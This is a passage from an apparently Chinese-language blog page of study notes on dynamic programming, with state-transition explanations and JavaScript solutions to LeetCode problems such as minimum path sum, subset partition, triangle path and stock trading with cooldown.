dp[i][j-1]</code>中小的那个</li><li>边界：<code>dp[0][0] = grid[0][0]</code></li><li>状态转移方程：<code>dp[i][j] = min(dp[i-1][j], dp[i][j-1]) + grid[i][j]</code>；</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> minPathSum <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> m <span class="token operator">=</span> grid<span class="token punctuation">.</span>length    <span class="token keyword">let</span> n <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length    <span class="token keyword">let</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="正则表达式匹配"><a href="#正则表达式匹配" class="headerlink" title="正则表达式匹配"></a>正则表达式匹配</h2><ul><li><p><a href="https://leetcode-cn.com/problems/regular-expression-matching/" target="_blank" rel="noopener">leetcode10</a></p></li><li><p><a href="https://leetcode-cn.com/problems/regular-expression-matching/solution/shou-hui-tu-jie-wo-tai-nan-liao-by-hyj8/" target="_blank" rel="noopener">题解</a></p></li></ul><h2 id="分割等和子集"><a href="#分割等和子集" class="headerlink" title="分割等和子集"></a>分割等和子集</h2><ul><li><a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/" target="_blank" rel="noopener">leetcode416</a></li></ul><blockquote><p>这个问题可以转化为求数组的一个子集，使得这个子集中的元素的和尽可能接近sum/2，其中sum为数组中所有元素的和。这样转换之后这个问题就很类似0-1背包问题了：在n件物品中找到m件物品，他们的可以装入背包中，且总价值最大不过这里不考虑价值，就考虑使得这些元素的和尽量接近sum/2。</p></blockquote><ul><li><a href="https://juejin.cn/post/6844903607855251463" target="_blank" rel="noopener">背包问题分析</a></li></ul><pre class=" language-js"><code class="language-js">输入<span class="token punctuation">:</span> n物品重W<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span> 价值V<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span> 背包容量C输出<span class="token punctuation">:</span> 装包使得价值最大 <span class="token punctuation">(</span>物品重量为整数<span class="token punctuation">)</span><span class="token punctuation">.</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">,</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> 由<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span>组合出重量<span class="token operator">&lt;=</span>k的最大价值如果第i件物品没有包括在其中，则dp<span class="token punctuation">[</span>i<span class="token punctuation">,</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">,</span>k<span class="token punctuation">]</span>如果第i件物品包括在其中，则dp<span class="token punctuation">[</span>i<span class="token punctuation">,</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">,</span>k<span class="token operator">-</span>W<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> V<span class="token punctuation">[</span>i<span class="token punctuation">]</span>转移方程：dp<span class="token punctuation">[</span>i<span class="token punctuation">,</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> max<span class="token punctuation">{</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">,</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">,</span>k<span class="token operator">-</span>W<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> V<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> canPartition <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span>length    <span class="token keyword">let</span> sum <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">+</span><span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> midSum <span class="token operator">=</span> sum <span class="token operator">></span><span class="token operator">></span> <span class="token number">1</span>    <span class="token keyword">let</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>midSum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> midSum<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">[</span>midSum<span class="token punctuation">]</span> <span class="token operator">===</span> sum <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="三角形的最小路径和"><a href="#三角形的最小路径和" class="headerlink" title="三角形的最小路径和"></a>三角形的最小路径和</h2><ul><li><a href="https://leetcode-cn.com/problems/triangle/" target="_blank" rel="noopener">leetcode120</a></li></ul><pre class=" language-js"><code class="language-js">输入：triangle <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token number">11</span>解释：如下面简图所示：   <span class="token number">2</span>  <span class="token number">3</span> <span class="token number">4</span> <span class="token number">6</span> <span class="token number">5</span> <span class="token number">7</span><span class="token number">4</span> <span class="token number">1</span> <span class="token number">8</span> <span class="token number">3</span>自顶向下的最小路径和为 <span class="token number">11</span>（即，<span class="token number">2</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">11</span>）。</code></pre><ul><li><p><code>dp[i][j]</code>表示从三角形顶部走到位置 (i, j) 的最小路径和，因此要想走到位置 (i, j)，上一步就只能在位置 (i - 1, j - 1)或者位置 (i - 1, j)</p></li><li><p>状态转移方程：<code>dp[i][j] = min(dp[i-1][j-1], dp[i-1][j]) + triangle[i][j]</code></p></li><li><p>边界条件：<code>dp[0][0] = triangle[0][0]</code></p></li><li>三角形的两腰上的 dp 值是确定的<ul><li><code>dp[i][0] = dp[i-1][0] + triangle[i][0]</code></li><li><code>dp[i][i] = dp[i-1][i-1] + triangle[i][i]</code></li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> minimumTotal <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>triangle<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> len <span class="token operator">=</span> triangle<span class="token punctuation">.</span>length    <span class="token keyword">let</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> triangle<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token punctuation">}</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token operator">...</span>dp<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2><ul><li><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/" target="_blank" rel="noopener">leetcode121</a></li></ul><pre class=" language-js"><code class="language-js">给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。注意：你不能在买入股票前卖出股票。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">5</span>解释<span class="token punctuation">:</span> 在第 <span class="token number">2</span> 天（股票价格 <span class="token operator">=</span> <span class="token number">1</span>）的时候买入，在第 <span class="token number">5</span> 天（股票价格 <span class="token operator">=</span> <span class="token number">6</span>）的时候卖出，最大利润 <span class="token operator">=</span> <span class="token number">6</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">5</span> 。     注意利润不能是 <span class="token number">7</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">,</span> 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">0</span>解释<span class="token punctuation">:</span> 在这种情况下<span class="token punctuation">,</span> 没有交易完成<span class="token punctuation">,</span> 所以最大利润为 <span class="token number">0</span>。</code></pre><blockquote><p>设 <code>dp[i]</code>为<code>i</code>支股票的最大利润，若已知前<code>i-1</code>支股票的最大利润为 <code>dp[i-1]</code>，怎么建立动态转移方程？</p><p>如果记录了前<code>i-1</code>支股票的最小值 min，那么最大利润一定是第<code>i</code>支股票的价格减去min所得的值与<code>dp[i-1]</code>之间的最大值，所以只需计算一下 <code>price[i] - min</code> 与<code>dp[i]</code> 的最大值</p></blockquote><ul><li>动态规划的三要素：最优子结构，边界，状态转移方程</li><li><code>dp[i]</code> 的 最优子结构就是 <code>dp[i-1]</code></li><li>边界：<code>dp[0] = 0</code></li><li>状态转移方程：<code>dp[i] = Math.max(dp[i-1], prices[i] - min);</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>prices<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">let</span> min <span class="token operator">=</span> prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> prices<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> min<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>min <span class="token operator">></span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            min <span class="token operator">=</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>dp<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>代码优化之后（看了<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/solution/121-mai-mai-gu-piao-de-zui-jia-shi-ji-by-leetcode-/" target="_blank" rel="noopener">官方题解</a>才领悟到不用 dp 也可直接写出如下）</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> min <span class="token operator">=</span> prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> prices<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> min<span class="token punctuation">)</span>        max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> min<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> max<span class="token punctuation">}</span></code></pre><h2 id="买卖股票的最佳时机（含冷冻期）"><a href="#买卖股票的最佳时机（含冷冻期）" class="headerlink" title="买卖股票的最佳时机（含冷冻期）"></a>买卖股票的最佳时机（含冷冻期）</h2><pre class=" language-js"><code class="language-js">给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）<span class="token punctuation">:</span>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。卖出股票后，你无法在第二天买入股票 <span class="token punctuation">(</span>即冷冻期为 <span class="token number">1</span> 天<span class="token punctuation">)</span>。示例<span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">3</span> 解释<span class="token punctuation">:</span> 对应的交易状态为<span class="token punctuation">:</span> <span class="token punctuation">[</span>买入<span class="token punctuation">,</span> 卖出<span class="token punctuation">,</span> 冷冻期<span class="token punctuation">,</span> 买入<span class="token punctuation">,</span> 卖出<span class="token punctuation">]</span></code></pre><ul><li>这道题自己没有想出来，看了很多题解，自己理解一下</li><li>设 <code>dp[i]</code> 为 截止至第<code>i</code>天的最大收益</li><li>对于每一天<code>i</code>都有两种状态<strong>持股</strong>和<strong>不持股</strong>，而不持股又分为<strong>当天卖出</strong>和<strong>本来就没有</strong><ul><li>持股：设为<code>dp[i][1]</code></li><li>不持股<ul><li>当天卖出了股票所以没有，设为<code>dp[i][2]</code></li><li>前一天就没有，今天也没有，设为<code>dp[i][0]</code></li></ul></li></ul></li><li>状态确定好后，下面就是如何建立状态转移方程？<ul><li>当天持股分为两种情况：<strong>当天买入</strong>和<strong>本来就有</strong>，找出效益最大值<ul><li>当天买入，前一天一定没有并且前一天没有卖出（<code>dp[i-1][0]</code>）,此时效益为<code>dp[i-1][0]-p[i]</code></li><li>前一天本来就有，此时的效益为<code>dp[i-1][1]</code></li><li>状态转移方程：<code>dp[i][1] = max(dp[i-1][1],dp[i-1][0]-p[i])</code></li></ul></li><li>不持股（当天卖出所以没有）<ul><li>当天卖出，前一天一定持有，此时的最大效益就是前一天的效益 + 卖出的价格</li><li>状态转移方程：<code>dp[i][2] = dp[i-1][1] + p[i]</code></li></ul></li><li>不持股（本来就没有）<ul><li>说明前一天也没有，最大效益就是前一天两种没有状态的最大值</li><li>状态转移方程：<code>dp[i][0] = max(dp[i-1][0],dp[i-1][2])</code></li></ul></li></ul></li><li>截止最后一天的最大效益一定是不持有状态的</li><li>边界：<code>dp[0][0] =  0</code>,<code>dp[0][2] = 0</code>,<code>dp[0][1] = -p[0]</code> </li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>prices<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">const</span> len <span class="token operator">=</span> prices<span class="token punctuation">.</span>length    <span class="token keyword">let</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span 